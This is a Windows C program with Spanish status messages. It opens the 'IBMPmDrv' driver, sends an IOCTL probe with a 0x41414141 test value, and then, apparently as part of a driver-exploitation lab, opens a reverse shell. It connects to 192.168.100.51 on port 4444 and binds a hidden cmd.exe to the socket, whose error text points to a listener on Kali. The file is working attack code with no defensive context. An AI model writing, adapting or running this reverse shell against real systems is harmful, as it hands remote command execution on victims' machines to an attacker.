#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <winsock2.h>
#include <windows.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")

#define DRIVER_NAME "\\\\.\\IBMPmDrv"
#define TARGET_IOCTL 0x22242C

int main() {
    HANDLE hDriver = CreateFileA(DRIVER_NAME, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);

    if (hDriver == INVALID_HANDLE_VALUE) {
        printf("[-] Error: No se pudo abrir el driver.\n");
        return 1;
    }

    DWORD inB = 0x41414141, outB = 0, bytes;

    if (DeviceIoControl(hDriver, TARGET_IOCTL, &inB, 4, &outB, 4, &bytes, NULL)) {
        printf("[!] IOCTL 0x22242C exitoso. Iniciando conexion...\n");

        WSADATA wsaData;
        WSAStartup(MAKEWORD(2, 2), &wsaData);

        SOCKET s = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = inet_addr("192.168.100.51");
        addr.sin_port = htons(4444);

        if (WSAConnect(s, (struct sockaddr*)&addr, sizeof(addr), NULL, NULL, NULL, NULL) == 0) {
            printf("[+] Conectado. Manteniendo shell abierta...\n");

            STARTUPINFOA si;
            PROCESS_INFORMATION pi;
            ZeroMemory(&si, sizeof(si));
            si.cb = sizeof(si);
            si.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);

            si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)s;
            si.wShowWindow = SW_HIDE;

            char cmdPath[] = "cmd.exe";

            if (CreateProcessA(NULL, cmdPath, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
                WaitForSingleObject(pi.hProcess, INFINITE);
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
            }
        }
        else {
            printf("[-] Error de red. Revisa el listener en Kali.\n");
        }

        closesocket(s);
        WSACleanup();
    }

    CloseHandle(hDriver);
    return 0;
}
